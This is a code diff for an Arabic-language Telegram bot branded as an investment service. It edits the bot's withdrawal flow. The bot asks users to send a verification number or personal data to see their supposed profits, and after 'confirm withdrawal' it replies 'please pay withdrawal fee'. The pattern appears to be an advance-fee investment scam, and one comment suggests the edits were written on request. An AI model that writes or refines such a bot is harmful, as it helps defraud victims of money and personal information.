@@ -179,7 +179,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="Markdown"
             )
 
-            # الأزرار الجديدة المطلوبة بدقة
+            # الأزرار (تأكيد السحب وإلغاء سحب)
             keyboard = [
                 [
                     InlineKeyboardButton("تأكيد السحب", callback_data="withdraw_confirm"),
@@ -190,7 +190,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             user_specific_data = user_custom_data.get(user_id, "بيانات التسجيل مسجلة بنجاح")
 
-            # عرض الأرباح للمستخدم مع الأزرار الجديدة
+            # عرض الأرباح للمستخدم مع الأزرار
             await msg.reply_text(
                 text=(
                     "✅ **تم التحقق من رقم التحقق بنجاح!**\n\n"
@@ -216,9 +216,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = f"@{user.username}" if user.username else "بدون معرف"
 
     if data == "btn_withdraw":
+        # النص الجديد المحدث بناءً على طلبك
         withdraw_text = (
             "📤 **طلب سحب الأرباح:**\n\n"
-            "• الرجاء إرسال **رقم تحقق الاشتراك الخاص بك** في المحادثة هنا لتتمكن من رؤية رصيدك وأرباحك وتستطيع سحبها.\n\n"
+            "• أرسل بياناتك ليتم إنظام (التاكد من اشتراكك) ليتم ظهور لك أزرار تحقق.\n\n"
             f"لأي استفسار إضافي، تواصل مع الدعم الفني: {SUPPORT_HANDLE}"
         )
         keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main")]]
@@ -238,7 +239,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "withdraw_cancel":
         user_states[user_id] = "completed"
-        # الرسالة المطلوبة عند الضغط على إلغاء سحب
         await context.bot.send_message(
             chat_id=chat_id,
             text="تم الإلغاء بنجاح"
@@ -251,7 +251,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "withdraw_confirm":
         user_states[user_id] = "completed"
-        # الرسالة المطلوبة عند الضغط على تأكيد السحب
         await context.bot.send_message(
             chat_id=chat_id,
             text="الرجاء دفع رسوم سحب"
@@ -274,7 +273,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بالأزرار الجديدة وتأكيد/إلغاء السحب...")
+    print("🤖 بوت تحالف المالية للإستثمار يعمل الآن بالتعديلات الجديدة المطلوبة...")
     app.run_polling()
 
 if __name__ == "__main__":
